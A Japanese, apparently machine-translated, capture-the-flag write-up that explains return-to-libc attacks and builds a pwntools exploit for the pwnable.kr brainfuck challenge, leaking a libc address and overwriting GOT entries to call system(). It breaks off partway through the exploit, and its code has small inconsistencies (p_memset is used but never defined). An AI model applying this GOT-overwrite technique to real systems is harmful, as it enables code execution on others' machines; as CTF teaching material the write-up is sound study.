ライブラリ攻撃に戻る


ライブラリへの攻撃（Return-to-libc攻撃）は、スタック上の関数の戻りアドレスがプログラム内の別の関数のアドレスに置き換えられ、呼び出された関数のパラメーターがスタックの次の部分に書き込まれる場合のバッファーオーバーフローに関連するコンピューター攻撃の一種です。この手法により、攻撃者は悪意のあるコードをプログラムに挿入する必要なく、ライブラリ内の既存の機能を実行できます。

Linuxには、任意のコマンドを実行するためのsystem（）などのCおよびPOSIX標準関数を提供する共有libcライブラリがあります。OSのWindowsファミリにも同様のライブラリが存在します。攻撃者はプログラムを任意のアドレスにジャンプさせることができますが、ほとんどのプログラムはlibc（リンクされている）を使用しますが、任意のコマンドを起動するための便利な機能を備えています。したがって、標準ライブラリの関数がそのようなエクスプロイトのターゲットである可能性が最も高く、攻撃のクラスに名前が付けられました。

horcruxesクエストの解決策


2番目のセクションを開始します。最初のコードよりも複雑で、アプリケーションのソースコードは提供されていません。ここでの議論を忘れないでください。始めましょう。

シグネチャーブレインファックのアイコンをクリックしてください。彼らは私たちに接続するためのアドレスとポート、プログラム自体、それのためのlibcライブラリを与え、それがbrainfuck言語エミュレータであることを説明します。



彼らが私たちに与えるすべてをダウンロードして、バイナリをチェックしてください。これは32ビットのエルフなので、IDA Proでプログラムを逆コンパイルします。



main関数に脆弱性はありません。メモリの割り当てと変数sに入力された文字数が制御されます。この前に、pポインターが初期化されます。ブレーンファック機能を見てみましょう。



この関数は、入力した文字列の各文字に使用されます。キャラクターに応じて、一連のアクションが含まれています。コマンドの完全なセットは次のようになります。

  • +：pにある値に1を加算します。
  • 、：標準入力から別の文字を受け取り、pで受け取ります。
  • -：pの値から1を減算します。
  • 。：アドレスpの文字を表示します。
  • <：pから減算します。
  • >：pに追加します。



したがって、私たちのタスクの解決策は、ポインターpを操作することによって発生します。その開始アドレスを見つけます。main関数では、可変テープのアドレスをpに入力します。つまり、0x804a0a0です。



同時に、got.pltセクションは0x804a000にあり、使用される関数のアドレスはlibcライブラリに格納されています。GOTとPLTについては、すでにここに書いています。



ポインターpを操作することでGOTに到達できるため、ret2libcのような攻撃を実装できます。これを行うには、使用される関数のアドレスをlibcからsystem（）関数のアドレスに書き換える必要があります（ライブラリも提供されています）。

したがって、次の攻撃ベクトルが出現します。

  1. アドレスfgetsをシステム関数のアドレスに書き換えます。
  2. memsetアドレスをgetsに書き換えます。
  3. putcharアドレスをmainに書き換えます。

これから来ること：上記のアクションが完了した後、putchar関数が呼び出されると、メイン関数が呼び出され、memsetではなくgetを呼び出して、入力した文字列をスタックにプッシュします。その後、fgetsの代わりにシステムが呼び出され、スタック（つまり、入力した行）から引数を取ります。

これを実装しましょう。最初に、ポインタと関数のアドレスを含むテンプレートを作成します。

from pwn import *

r = remote('pwnable.kr', 9001)

p = 0x804a0a0

p_fgets = 0x804a010
p_puts = 0x804a018
p_putchar = 0x804a030
p_main = 0x8048671

次に、ポインタを必要なステップ数にシフトする関数を記述します。

def mvAddr(n):
	global p 
	p += n
	if n > 0:
		return ">"*n
	else:
		return "<"*((-1)*n)

4バイトを読み取る関数：

def readVar():
	return ".>"*4 + "<"*4

4バイトを受け入れて書き込む関数：

def writeVar():
	return ",>"*4 + "<"*4

ロードを書き込みます。これは簡単です-fgetsアドレスに移動し、読み取り（後で理由を説明します）、再書き込みします... memsetアドレスに移動します-再書き込みし、putcharアドレスに移動します-再書き込みします。すべてがアイデアのようです。

payload = mvAddr(p_fgets - p)
payload += readVar()
payload += writeVar()
payload += mvAddr(p_memset - p)
payload += writeVar()
payload += mvAddr(p_putchar - p)
payload += writeVar()
payload += '.'

では、なぜfgetsのアドレスを読むのでしょうか。これはgot.pltなので、fgetsのアドレスを関連するlibcライブラリに読み取ります。libcライブラリ（無関係）があるだけなので、リンクされたライブラリの関数のアドレスから無関係なライブラリの同じ関数のアドレスを引くと、ベース、つまり、mファイル（ライブラリコードの先頭）によってライブラリがリンクされるアドレスが決まります。次に、無関係なライブラリ内の関数のオフセットをベースに追加すると、既に接続されている関数のこの関数のアドレスに到達します。つまり、定義されていないバイナリから関数を呼び出します...

したがって、このロードにより、リンクされたライブラリ内の関数のアドレスがわかります。リンクなしで彼女の住所を見つけましょう。

libc = ELF('./bf_libc.so')
